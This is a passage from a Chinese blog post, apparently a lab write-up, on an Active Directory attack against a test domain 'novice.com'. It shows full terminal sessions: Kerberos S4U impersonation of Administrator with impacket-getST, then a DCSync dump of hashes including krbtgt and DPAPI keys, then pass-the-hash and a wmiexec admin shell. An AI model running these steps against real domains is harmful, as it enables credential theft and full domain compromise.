+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs prolog">┌──(root㉿kaada)-[/home/kali/<span class="hljs-symbol">Desktop</span>]<br>└─# impacket-getST -spn <span class="hljs-string">&#x27;cifs/DC.novice.com&#x27;</span> -impersonate <span class="hljs-symbol">Administrator</span> -dc-ip <span class="hljs-number">192.168</span><span class="hljs-number">.21</span><span class="hljs-number">.130</span> <span class="hljs-string">&#x27;novice.com/EVILPC$:EvilPass123!&#x27;</span><br><span class="hljs-symbol">Impacket</span> v0<span class="hljs-number">.14</span><span class="hljs-number">.0</span>.dev0 - <span class="hljs-symbol">Copyright</span> <span class="hljs-symbol">Fortra</span>, <span class="hljs-symbol">LLC</span> and its affiliated companies <br><br>[-] <span class="hljs-symbol">CCache</span> file is not found. <span class="hljs-symbol">Skipping</span>...<br>[*] <span class="hljs-symbol">Getting</span> <span class="hljs-symbol">TGT</span> for user<br>[*] <span class="hljs-symbol">Impersonating</span> <span class="hljs-symbol">Administrator</span><br>[*] <span class="hljs-symbol">Requesting</span> <span class="hljs-symbol">S4U2self</span><br>[*] <span class="hljs-symbol">Requesting</span> <span class="hljs-symbol">S4U2Proxy</span><br>[*] <span class="hljs-symbol">Saving</span> ticket in <span class="hljs-symbol">Administrator</span>@cifs_DC.novice.com@<span class="hljs-symbol">NOVICE</span>.<span class="hljs-symbol">COM</span>.ccache<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">┌──(root㉿kaada)-[<span class="hljs-regexp">/home/</span>kali/Desktop]<br>└─<span class="hljs-comment"># ls</span><br>20260219050404_bloodhound.zip                       FScan_2.<span class="hljs-number">0</span>.1_linux_x32            nc.exe         rustscan               sucrack<br>Administrator<span class="hljs-variable">@cifs_DC</span>.novice.com<span class="hljs-variable">@NOVICE</span>.COM.ccache <br></code></pre></td></tr></table></figure>
+
+<p>第四步：导入票据与 DCSync </p>
+<p>用刚刚生成的票据导入环境变量让后续的 Impacket 工具自动使用它进行 Kerberos 认证（不要使用密码）</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# <span class="hljs-built_in">export</span> <span class="hljs-attribute">KRB5CCNAME</span>=Administrator@cifs_DC.novice.com@NOVICE.COM.ccache<br><br></code></pre></td></tr></table></figure>
+
+<p>执行DCsync攻击导出所有哈希</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs elixir">┌──(root㉿kaada)-[/home/kali/<span class="hljs-title class_">Desktop</span>]<br>└─<span class="hljs-comment"># impacket-secretsdump -k -no-pass DC.novice.com</span><br><span class="hljs-title class_">Impacket</span> v0.<span class="hljs-number">14.0</span>.dev0 - <span class="hljs-title class_">Copyright</span> <span class="hljs-title class_">Fortra</span>, <span class="hljs-title class_">LLC</span> <span class="hljs-keyword">and</span> its affiliated companies <br><br>[*] <span class="hljs-title class_">Service</span> <span class="hljs-title class_">RemoteRegistry</span> is <span class="hljs-keyword">in</span> stopped state<br>[*] <span class="hljs-title class_">Starting</span> service <span class="hljs-title class_">RemoteRegistry</span><br>[*] <span class="hljs-title class_">Target</span> system <span class="hljs-symbol">bootKey:</span> <span class="hljs-number">0x9aec2145c768b9975d683cbd0b2138e0</span><br>[*] <span class="hljs-title class_">Dumping</span> local <span class="hljs-title class_">SAM</span> hashes (<span class="hljs-symbol">uid:</span><span class="hljs-symbol">rid:</span><span class="hljs-symbol">lmhash:</span>nthash)<br><span class="hljs-symbol">Administrator:</span><span class="hljs-number">500</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:bbabdc192282668fe5190ab0c5150b34</span>:::<br><span class="hljs-symbol">Guest:</span><span class="hljs-number">501</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br><span class="hljs-symbol">DefaultAccount:</span><span class="hljs-number">503</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br>[*] <span class="hljs-title class_">Dumping</span> cached domain logon information (domain/<span class="hljs-symbol">username:</span>hash)<br>[*] <span class="hljs-title class_">Dumping</span> <span class="hljs-title class_">LSA</span> <span class="hljs-title class_">Secrets</span><br>[*] <span class="hljs-variable">$MACHINE</span>.<span class="hljs-title class_">ACC</span> <br><span class="hljs-title class_">NOVICE</span>\<span class="hljs-title class_">DC</span><span class="hljs-variable">$:</span><span class="hljs-symbol">plain_password_hex:</span><span class="hljs-number">6454</span>fcd3651871f06169975c90882651d512f6bd88eb6513625ba8d99345d3de876754b3e3f9bf58cfc3add6cb05f8bea733d5f0df9f622ab68b3daacf1d255bc441b453050330aab4c548c86c0f9a3c5f537964ae483ac161bbe74145a1dffb6a1859df45b64b02c01bdae24fcb58be1ea2ded8eee4bf0014ee73f5fcd8c3faa0bcc080b4f5233286f4fce1cfffe878b5ee4f79f9215cdf59d0151a0e516894562914031807df1bfd9b9f3df285e3f7b570ecc67d187bc0d982b17ddd307a4288a74854c9916887abd47a42ba7c70b6aa0cde01f8dc240dd556b1f2e5e083ff85022153174300275556b609ee322a19<br><span class="hljs-title class_">NOVICE</span>\<span class="hljs-title class_">DC</span><span class="hljs-variable">$:</span><span class="hljs-symbol">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">59895085</span>a4120299fc9fb7158c5b310d:::<br>[*] <span class="hljs-title class_">DPAPI_SYSTEM</span> <br><span class="hljs-symbol">dpapi_machinekey:</span><span class="hljs-number">0xdead8f737ed36bb82d5a6f44687f0d926e30b276</span><br><span class="hljs-symbol">dpapi_userkey:</span><span class="hljs-number">0xddbacb41fc6cd581597fa5ab3862023b5109d8b5</span><br>[*] <span class="hljs-title class_">NL</span><span class="hljs-variable">$KM</span> <br> <span class="hljs-number">0000</span>   <span class="hljs-number">48</span> <span class="hljs-title class_">E8</span> <span class="hljs-title class_">ED</span> <span class="hljs-title class_">C0</span> <span class="hljs-number">9</span>F <span class="hljs-title class_">C8</span> <span class="hljs-title class_">D4</span> <span class="hljs-title class_">BE</span>  <span class="hljs-number">37</span> <span class="hljs-number">81</span> <span class="hljs-title class_">D7</span> <span class="hljs-number">2</span>B <span class="hljs-title class_">D4</span> <span class="hljs-title class_">B1</span> <span class="hljs-number">87</span> <span class="hljs-title class_">C1</span>   H.......<span class="hljs-number">7</span>..+....<br> <span class="hljs-number">0010</span>   <span class="hljs-number">3</span>C <span class="hljs-title class_">A7</span> <span class="hljs-title class_">DA</span> <span class="hljs-number">68</span> <span class="hljs-number">3</span>B <span class="hljs-title class_">CF</span> <span class="hljs-number">48</span> <span class="hljs-title class_">DF</span>  <span class="hljs-number">9</span>C <span class="hljs-number">24</span> <span class="hljs-number">64</span> <span class="hljs-number">88</span> <span class="hljs-title class_">D4</span> <span class="hljs-number">83</span> <span class="hljs-number">8</span>B <span class="hljs-title class_">F0</span>   &lt;..h;.H..<span class="hljs-variable">$d</span>.....<br> <span class="hljs-number">0020</span>   <span class="hljs-title class_">CE</span> <span class="hljs-title class_">CA</span> <span class="hljs-title class_">F8</span> <span class="hljs-title class_">FB</span> <span class="hljs-number">07</span> <span class="hljs-title class_">C8</span> <span class="hljs-number">07</span> <span class="hljs-number">0</span>A  <span class="hljs-number">4</span>A <span class="hljs-number">5</span>A <span class="hljs-title class_">F6</span> <span class="hljs-title class_">AD</span> <span class="hljs-number">11</span> <span class="hljs-title class_">DB</span> <span class="hljs-number">87</span> <span class="hljs-number">28</span>   ........<span class="hljs-title class_">JZ</span>.....(<br> <span class="hljs-number">0030</span>   <span class="hljs-title class_">B8</span> <span class="hljs-title class_">DD</span> <span class="hljs-number">0</span>C <span class="hljs-title class_">E7</span> <span class="hljs-number">35</span> <span class="hljs-number">0</span>E <span class="hljs-number">1</span>D <span class="hljs-number">37</span>  <span class="hljs-number">18</span> <span class="hljs-title class_">AA</span> <span class="hljs-title class_">CA</span> <span class="hljs-title class_">BD</span> <span class="hljs-title class_">D6</span> <span class="hljs-title class_">C7</span> <span class="hljs-number">90</span> <span class="hljs-number">26</span>   ....<span class="hljs-number">5</span>..<span class="hljs-number">7</span>.......&amp;<br><span class="hljs-title class_">NL</span><span class="hljs-variable">$KM</span><span class="hljs-symbol">:</span><span class="hljs-number">48</span>e8edc09fc8d4be3781d72bd4b187c13ca7da683bcf48df9c246488d4838bf0cecaf8fb07c8070a4a5af6ad11db8728b8dd0ce7350e1d3718aacabdd6c79026<br>[*] <span class="hljs-title class_">Dumping</span> <span class="hljs-title class_">Domain</span> <span class="hljs-title class_">Credentials</span> (domain\<span class="hljs-symbol">uid:</span><span class="hljs-symbol">rid:</span><span class="hljs-symbol">lmhash:</span>nthash)<br>[*] <span class="hljs-title class_">Using</span> the <span class="hljs-title class_">DRSUAPI</span> method to get <span class="hljs-title class_">NTDS</span>.<span class="hljs-title class_">DIT</span> secrets<br><span class="hljs-symbol">Administrator:</span><span class="hljs-number">500</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:bbabdc192282668fe5190ab0c5150b34</span>:::<br><span class="hljs-symbol">Guest:</span><span class="hljs-number">501</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br><span class="hljs-symbol">krbtgt:</span><span class="hljs-number">502</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span>d77123d1c64e2da30028f21bbb91d0:::<br><span class="hljs-symbol">MrRobot:</span><span class="hljs-number">1104</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:c8fa8686516464c51cfc0bdc3e52ef9e</span>:::<br><span class="hljs-title class_">DC</span><span class="hljs-variable">$:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">59895085</span>a4120299fc9fb7158c5b310d:::<br><span class="hljs-title class_">EVILPC</span><span class="hljs-variable">$:</span><span class="hljs-number">2101</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span>ce986df7478744a81b7d00446da7417:::<br>[*] <span class="hljs-title class_">Kerberos</span> keys grabbed<br><span class="hljs-symbol">Administrator:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">0218</span>bc05d978eff9d49b5578b0b82d2b6f6fd19b47b55f91c07a555dac208574<br><span class="hljs-symbol">Administrator:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">4</span>f3a074e29171c06ab3db041c1be2128<br><span class="hljs-symbol">Administrator:</span>des-cbc-<span class="hljs-symbol">md5:</span><span class="hljs-number">34701</span>ccb6efb9704<br><span class="hljs-symbol">krbtgt:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">1767397277</span>e40d45c7924647e4b2ce3b211a87bbe5aa345beba0cb95886d696f<br><span class="hljs-symbol">krbtgt:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:ab93922b57ce1a5ab5e6e8f4ea078f4e</span><br><span class="hljs-symbol">krbtgt:</span>des-cbc-<span class="hljs-symbol">md5:</span><span class="hljs-number">58</span>a104e55ec89eb9<br><span class="hljs-symbol">MrRobot:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span>cd49c483c6f0e1977b9d0939c84f72d017724c26bb54d742309e70f0872a1d5<br><span class="hljs-symbol">MrRobot:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">67</span>d90694c72b439b2921976fb1f775cf<br><span class="hljs-symbol">MrRobot:</span>des-cbc-<span class="hljs-symbol">md5:</span><span class="hljs-number">62</span>b39b86f862d3fd<br><span class="hljs-title class_">DC</span><span class="hljs-variable">$:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:c8f24757655c70f50c7ec4fdaa365848392a2a969b4da2c0e3fc4580290bd234</span><br><span class="hljs-title class_">DC</span><span class="hljs-variable">$:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:f273380db059a96f5f66ea2cfdce97b0</span><br><span class="hljs-title class_">DC</span><span class="hljs-variable">$:</span>des-cbc-<span class="hljs-symbol">md5:</span><span class="hljs-number">34</span>ae2a0d1cd9ecdc<br><span class="hljs-title class_">EVILPC</span><span class="hljs-variable">$:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span>bf6710bb192fe177171749e5a228cb0940b783561f2a88558e5adbe0b25b1a<br><span class="hljs-title class_">EVILPC</span><span class="hljs-variable">$:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span>fc6a16715a142b4fb8a38b230bcf6d5<br><span class="hljs-title class_">EVILPC</span><span class="hljs-variable">$:</span>des-cbc-<span class="hljs-symbol">md5:</span><span class="hljs-number">57</span>ec67611675d089<br>[*] <span class="hljs-title class_">Cleaning</span> up... <br>[*] <span class="hljs-title class_">Stopping</span> service <span class="hljs-title class_">RemoteRegistry</span><br>[-] <span class="hljs-title class_">SCMR</span> <span class="hljs-symbol">SessionError:</span> <span class="hljs-symbol">code:</span> <span class="hljs-number">0x41b</span> - <span class="hljs-title class_">ERROR_DEPENDENT_SERVICES_RUNNING</span> - A stop control has been sent to a service that other running services are dependent on.<br>[*] <span class="hljs-title class_">Cleaning</span> up... <br>[*] <span class="hljs-title class_">Stopping</span> service <span class="hljs-title class_">RemoteRegistry</span><br><span class="hljs-title class_">Exception</span> ignored <span class="hljs-symbol">in:</span> &lt;function <span class="hljs-title class_">Registry</span>.__del__ at <span class="hljs-number">0x7f06f7e08900</span>&gt;<br><span class="hljs-title class_">Traceback</span> (most recent call last):<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/winregistry.py&quot;</span>, line <span class="hljs-number">172</span>, <span class="hljs-keyword">in</span> __del__<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/winregistry.py&quot;</span>, line <span class="hljs-number">169</span>, <span class="hljs-keyword">in</span> close<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/examples/secretsdump.py&quot;</span>, line <span class="hljs-number">409</span>, <span class="hljs-keyword">in</span> close<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/smbconnection.py&quot;</span>, line <span class="hljs-number">633</span>, <span class="hljs-keyword">in</span> closeFile<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/smb3.py&quot;</span>, line <span class="hljs-number">1357</span>, <span class="hljs-keyword">in</span> close<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/smb3.py&quot;</span>, line <span class="hljs-number">474</span>, <span class="hljs-keyword">in</span> sendSMB<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/smb3.py&quot;</span>, line <span class="hljs-number">443</span>, <span class="hljs-keyword">in</span> signSMB<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/crypto.py&quot;</span>, line <span class="hljs-number">150</span>, <span class="hljs-keyword">in</span> <span class="hljs-title class_">AES_CMAC</span><br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/Cryptodome/Cipher/AES.py&quot;</span>, line <span class="hljs-number">228</span>, <span class="hljs-keyword">in</span> new<br><span class="hljs-symbol">KeyError:</span> <span class="hljs-string">&#x27;Cryptodome.Cipher.AES&#x27;</span><br><span class="hljs-title class_">Exception</span> ignored <span class="hljs-symbol">in:</span> &lt;function <span class="hljs-title class_">Registry</span>.__del__ at <span class="hljs-number">0x7f06f7e08900</span>&gt;<br><span class="hljs-title class_">Traceback</span> (most recent call last):<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/winregistry.py&quot;</span>, line <span class="hljs-number">172</span>, <span class="hljs-keyword">in</span> __del__<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/winregistry.py&quot;</span>, line <span class="hljs-number">169</span>, <span class="hljs-keyword">in</span> close<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/examples/secretsdump.py&quot;</span>, line <span class="hljs-number">409</span>, <span class="hljs-keyword">in</span> close<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/smbconnection.py&quot;</span>, line <span class="hljs-number">633</span>, <span class="hljs-keyword">in</span> closeFile<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/smb3.py&quot;</span>, line <span class="hljs-number">1357</span>, <span class="hljs-keyword">in</span> close<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/smb3.py&quot;</span>, line <span class="hljs-number">474</span>, <span class="hljs-keyword">in</span> sendSMB<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/smb3.py&quot;</span>, line <span class="hljs-number">443</span>, <span class="hljs-keyword">in</span> signSMB<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/crypto.py&quot;</span>, line <span class="hljs-number">150</span>, <span class="hljs-keyword">in</span> <span class="hljs-title class_">AES_CMAC</span><br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/Cryptodome/Cipher/AES.py&quot;</span>, line <span class="hljs-number">228</span>, <span class="hljs-keyword">in</span> new<br><span class="hljs-symbol">KeyError:</span> <span class="hljs-string">&#x27;Cryptodome.Cipher.AES&#x27;</span><br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs smali">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># nxc smb 192.168.21.130 -u administrator -H bbabdc192282668fe5190ab0c5150b34</span><br>SMB         192.168.21.130  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:novice.com) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                                                <br>SMB         192.168.21.130  445    DC               [+] novice.com\administrator:bbabdc192282668fe5190ab0c5150b34 (Pwn3d!)<br><br>┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># impacket-wmiexec -k -no-pass DC.novice.com </span><br>Impacket v0.14.0.dev0 - Copyright Fortra, LLC<span class="hljs-built_in"> and </span>its affiliated companies <br><br>[*] SMBv3.0 dialect used<br>[!] Launching semi-interactive shell - Careful what you<span class="hljs-built_in"> execute</span><br><span class="hljs-built_in"></span>[!] Press help for extra shell commands<br>C:\&gt;whoami<br>novice\administrator<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%9D%82%E8%AE%B0/" class="print-no-link">#杂记</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ad攻击小记</div>
+      <div>http://example.com/2026/02/18/ad攻击小记/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Skyarrow</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>February 18, 2026</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/02/15/HackTheBox-WingData/" title="HackTheBox-WingData">
+                        <span class="hidden-mobile">HackTheBox-WingData</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <style>.statistics { display: none !important; }</style>
+<a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+<br>
+<script async src="//cdn.busuanzi.cc/busuanzi/3.6.9/busuanzi.min.js"></script>
+<span id="busuanzi_container_site_pv"> 本站总访问量 <span id="busuanzi_site_pv" style="color:red">...</span> 次 </span> &nbsp; | &nbsp; <span id="busuanzi_container_site_uv"> 总访客数 <span id="busuanzi_site_uv" style="color:red">...</span> 人 </span> 
+    </div>
+  
+  
+  
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
